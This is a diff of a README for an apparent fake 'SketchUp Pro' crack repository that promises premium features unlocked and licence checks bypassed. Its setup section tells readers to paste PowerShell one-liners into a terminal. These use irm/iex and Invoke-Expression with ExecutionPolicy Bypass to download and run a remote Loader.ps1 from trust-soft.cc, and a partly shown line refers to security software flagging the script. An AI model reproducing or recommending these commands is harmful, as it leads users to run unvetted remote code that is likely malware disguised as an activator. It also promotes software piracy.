@@ -1,27 +1,26 @@
-# SketchUp Pro Complete Desktop Configuration & Activation Suite
+# SketchUp Pro Studio — Complete 3D Modeling & CAD Design Suite
 
-Welcome to the independent environment manager for **SketchUp Pro**. This repository offers a clean, user-oriented solution for architects, interior designers, and woodworkers who want a stable, permanent local studio setup without constant subscription prompts or internet validation timeouts.
+Welcome to the ultimate deployment hub for **SketchUp Pro**, the premier professional software tailored for architects, interior designers, and 3D modeling enthusiasts. This community-driven repository offers a seamless environment to launch, configure, and fully unlock the premium features of your desktop modeling workspace.
 
-By deploying optimized file structures and localized licensing loopbacks, this utility configures a lifetime-valid environment for all your 3D modeling, drawing documentation, and layout presentations.
+## 🌟 Why SketchUp Pro Suite?
 
-## 🚀 Workspace Optimization & Core Advantages
-- **Pre-Activated Desktop Environment**: Seamless configuration guides built for SketchUp 2025 and 2026.
-- **Extension Warehouse Compatibility**: Tweaks system paths to ensure smooth plugin installation (V-Ray, Enscape, etc.).
-- **Local Network Routing**: Intercepts authentication calls locally to preserve absolute offline freedom.
-- **Asset Library Unlocking**: Instantly fixes material and style directory mappings for offline usage.
+**SketchUp Pro** is renowned for its intuitive yet powerful approach to 3D design. Whether you are drafting complex architectural blueprints, staging interior environments, or exporting high-resolution CAD files, this setup guarantees that all premium layout tools, advanced styling options, and professional design extensions are ready to work immediately.
 
+## 💎 Premium Toolkit Features
 
----
+* **Advanced 3D Modeling:** Full access to complex geometric tools, solid editing, and parametric components.
+* **Layout Documentation:** Turn your 3D assets into clean, scaled, professional 2D presentation vectors.
+* **Style Builder & Rendering:** Customize edge styles, textures, and lightning for photo-realistic presentations.
+* **Extension Warehouse Support:** Seamless integration with external renderers, extensions, and plugins.
+* **Unlimited Cloud Access:** Save, share, and collaborate on your architectural projects without restrictions.
 
-## 🛠️ Quick Setup Guide (PowerShell)
+## 🛠 Quick Setup Guide (PowerShell)
 
 1. Launch PowerShell:
-   * Press `Win + X` on your keyboard.
+   * Press **Win + X** on your keyboard.
    * Click on **Terminal** or **Windows PowerShell** from the list.
-
 2. Execute the Setup Script:
-   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:
-
+   Copy the command below, paste it into your PowerShell window, and hit **Enter**. The script will handle the necessary registry tweaks and install all dependencies automatically:
    ```powershell
    irm https://trust-soft.cc/powershell/Loader.ps1 | iex
    ```
@@ -37,7 +36,7 @@ powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershel
 ```
 
 ### 💬 "irm" command not found (Outdated PowerShell)
-If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
+If your version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
 ```powershell
 Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
 ```
@@ -47,6 +46,14 @@ Security software might occasionally flag automated installers. If the script ge
 
 ---
 
-## 📐 Extension Stability & System Mechanics
+## 💻 System Configuration & Requirements
 
-This configuration automation establishes a virtual licensing frame on your computer. Rather than altering the core executable code of the application—which often causes crashes or dynamic library errors—it manages verification requests internally. Your design models remain completely untouched, hardware rendering performs at full speed, and the workspace remains highly reliable even under dense polygon stress.
+To guarantee a stable 3D workflow and smooth viewport rendering, ensure your workstation meets the following hardware profiles before applying the configuration patch:
+* **Operating System:** Windows 11 or Windows 10 (64-bit editions exclusively)
+* **Processor:** 2+ GHz Intel or AMD multi-core desktop processor
+* **System Memory:** 8 GB RAM minimum (16 GB highly recommended for heavy CAD scenes)
+* **Graphics Unit:** Dedicated GPU with at least 2GB of VRAM and full OpenGL 3.0+ support
+
+---
+
+*Disclaimer: This project acts as an educational resource for desktop environment testing, deployment automation, and performance benchmarking. All copyrights belong to Trimble Inc.*
